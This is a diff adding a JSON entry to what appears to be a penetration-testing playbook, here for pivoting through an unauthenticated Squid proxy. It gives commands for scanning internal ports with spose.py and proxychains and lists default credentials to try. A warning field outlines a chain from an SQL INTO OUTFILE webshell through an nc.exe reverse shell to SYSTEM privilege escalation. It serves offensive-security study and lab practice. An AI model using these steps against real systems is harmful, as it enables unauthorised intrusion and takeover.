@@ -1,0 +1,30 @@
+{
+  "id": "squid_proxy",
+  "phase": "RECON",
+  "title": "Squid HTTP Proxy (3128) — Internal Port Scan + Pivot",
+  "body": "Squid is an HTTP proxy server. Port 3128 is the default. An open unauthenticated Squid proxy lets you route HTTP traffic through it to reach internal services that aren't directly exposed — web apps, databases, and admin panels that only listen on localhost or internal interfaces. The attack chain: discover internal ports via spose.py → route browser/Burp through proxy → access internal service → exploit from there.\n\nKey insight: nmap only shows ports reachable from outside. A Squid proxy can expose ports like 8080 (web app), 3306 (MySQL), or 5432 (Postgres) that are bound to 127.0.0.1 on the target. spose.py uses the proxy to check which ports are reachable through it.",
+  "cmd": "# ══════════════════════════════════════════════════\n# IDENTIFY\n# ══════════════════════════════════════════════════\n# nmap fingerprint:\n# 3128/tcp open http-proxy Squid http proxy 4.14\n# |_http-server-header: squid/4.14\n\n# Confirm it's open/unauthenticated:\ncurl -x http://$ip:3128 http://google.com -I 2>&1 | head -5\n# HTTP/1.1 200 → open proxy, no auth\n# 407 Proxy Authentication Required → needs creds\n# Connection refused / ERR → not accessible\n\n# ══════════════════════════════════════════════════\n# STEP 1 — DISCOVER INTERNAL PORTS (spose.py)\n# ══════════════════════════════════════════════════\ngit clone https://github.com/aancw/spose exploits/spose\ncd exploits/spose\n\n# Scan common ports behind the proxy:\npython3 spose.py --proxy http://$ip:3128 --target $ip\n# Scans default common ports — fast\n\n# Scan all 65535 ports (slow but thorough):\npython3 spose.py --proxy http://$ip:3128 --target $ip --allports\n\n# Scan specific ports:\npython3 spose.py --proxy http://$ip:3128 --target $ip --ports 80,8080,8443,3306,5432,6379,27017\n\n# Ports worth checking:\n# 8080 / 8443  web app (phpMyAdmin, Jenkins, Tomcat, admin panels)\n# 3306         MySQL\n# 5432         PostgreSQL\n# 6379         Redis (unauthenticated)\n# 27017        MongoDB\n# 8090         Confluence\n# 5985         WinRM (reachable via NTLM in Burp)\n\n# ══════════════════════════════════════════════════\n# STEP 2 — BROWSE INTERNAL SERVICES\n# ══════════════════════════════════════════════════\n# Option A — curl through proxy:\ncurl -x http://$ip:3128 http://$ip:8080/\ncurl -x http://$ip:3128 http://127.0.0.1:8080/\n\n# Option B — Burp Suite proxy chain (recommended for web apps):\n# Burp → User options → Upstream Proxy Servers\n# Host: $ip  Port: 3128  No auth\n# Now browse http://$ip:8080 in the browser through Burp\n# Full interaction: login forms, file uploads, everything\n\n# Option C — Firefox manual proxy:\n# Settings → Network → Manual proxy → HTTP Proxy: $ip  Port: 3128\n# Now browse normally — all traffic routes through Squid\n\n# Option D — proxychains:\necho 'http $ip 3128' >> /etc/proxychains4.conf\nproxychains nmap -sT -Pn -p 80,8080,3306 $ip\nproxychains curl http://$ip:8080/\n\n# ══════════════════════════════════════════════════\n# WHAT TO LOOK FOR ON INTERNAL SERVICES\n# ══════════════════════════════════════════════════\n# phpMyAdmin on 8080: try root:blank, root:root, admin:admin\n# Jenkins:           try admin:admin, check /script for Groovy RCE\n# Tomcat manager:    try tomcat:tomcat, admin:admin → WAR upload\n# Redis:             unauthenticated → config set dir → write files\n# WAMP/XAMPP:        C:/wamp/www or C:/xampp/htdocs web root paths\n\n# ══════════════════════════════════════════════════\n# TROUBLESHOOTING\n# ══════════════════════════════════════════════════\n# spose returns nothing:\n#   → Try both $ip and 127.0.0.1 as target\n#   → Some Squid configs block loopback: python3 spose.py --proxy http://$ip:3128 --target 127.0.0.1\n\n# 407 Proxy Auth Required:\n#   → Try default creds: admin:admin, squid:squid, proxy:proxy\n#   → curl -x http://user:pass@$ip:3128 http://$ip:8080/\n\n# Service found but page won't load in browser:\n#   → Hostname resolution issue — use IP not hostname in URL\n#   → Try: curl -x http://$ip:3128 http://$ip:8080/ to confirm it's reachable",
+  "warn": "Always scan both $ip AND 127.0.0.1 as the spose target — some services bind to localhost only and appear under 127.0.0.1, not the external IP. The Squid box pattern: spose finds 8080 → phpMyAdmin with root:blank → SQL INTO OUTFILE webshell to Windows web root (C:/wamp/www/) → certutil to transfer nc.exe → reverse shell → SeImpersonate → SYSTEM.",
+  "choices": [
+    {
+      "label": "Found phpMyAdmin on internal port",
+      "next": "phpmyadmin"
+    },
+    {
+      "label": "Found Redis on internal port",
+      "next": "redis"
+    },
+    {
+      "label": "Found Jenkins on internal port",
+      "next": "jenkins"
+    },
+    {
+      "label": "Found Tomcat on internal port",
+      "next": "tomcat"
+    },
+    {
+      "label": "Back to jump services",
+      "next": "jump_services"
+    }
+  ]
+}
